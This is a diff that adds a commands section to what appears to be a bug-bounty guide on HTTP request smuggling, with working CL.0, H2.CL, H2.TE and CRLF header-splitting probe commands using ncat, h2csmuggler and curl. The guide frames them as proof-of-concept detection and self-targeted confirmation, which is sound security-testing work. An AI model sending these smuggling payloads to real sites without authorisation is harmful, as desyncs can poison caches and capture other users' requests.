@@ -69,6 +69,38 @@ Copy it with CRLF. The four body bytes the CL parser keeps are `1` CR LF `A`; th
    Same unique-path confirmation for all three. Client-side desync is the browser-shaped 0.CL/CL.0 case: one navigation you control, not a campaign. Set `Content-Length` (CL.0/0.CL) or the chunk length (TE.0) to the exact byte length of the smuggled request, including its final CRLF.
 9. **Hop-by-hop.** `Connection: Content-Length` (or `Transfer-Encoding`) asks a proxy to strip that header before the next hop. If an edge strips it and the next proxy still split on it, you get a desync. One probe. Akamai-style edge cache poisoning from this primitive is `hunt-cache-poison` and must be proven on a cache-buster you own.
 
+## Concrete tools & commands
+
+**CL.0 probe (keep-alive, body after response):**
+```bash
+printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 41\r\nConnection: keep-alive\r\n\r\nGET /smug-UNIQ HTTP/1.1\r\nHost: TARGET\r\n\r\nGET / HTTP/1.1\r\nHost: TARGET\r\n\r\n' | ncat --ssl TARGET 443
+```
+If the second response is for `/smug-UNIQ`, the backend ignored the first request's body.
+
+**H2.CL via h2csmuggler (HTTP/2 → HTTP/1.1 downgrade):**
+```bash
+python3 h2csmuggler.py -x https://TARGET/ -H "Content-Length: 0" \
+  --data 'GET /smug-UNIQ HTTP/1.1\r\nHost: TARGET\r\n\r\n'
+```
+
+**H2.TE via curl (HTTP/2 with Transfer-Encoding the proxy should strip):**
+```bash
+curl -k --http2 -X POST "https://TARGET/" \
+  -H "Transfer-Encoding: chunked" \
+  -d $'0\r\n\r\nGET /smug-UNIQ HTTP/1.1\r\nHost: TARGET\r\n\r\n'
+```
+Most HTTP/2 front-ends strip TE:chunked; if the origin still sees it after downgrade, desync.
+
+**H2 header splitting (CRLF in header value):**
+```bash
+python3 -c "
+import h2.connection, h2.config, socket, ssl
+# Send a header whose value contains \r\nGET /smug-UNIQ ...
+# The HTTP/1.1 translation splits it into a second request
+"
+```
+Use Burp HTTP Request Smuggler extension for interactive H2 probes — raw sockets above are for verification.
+
 ## What to do with a confirmed prefix
 Use it once, against yourself:
 - Unique path in the smuggled request line → second response is for that path (parser bug proven).
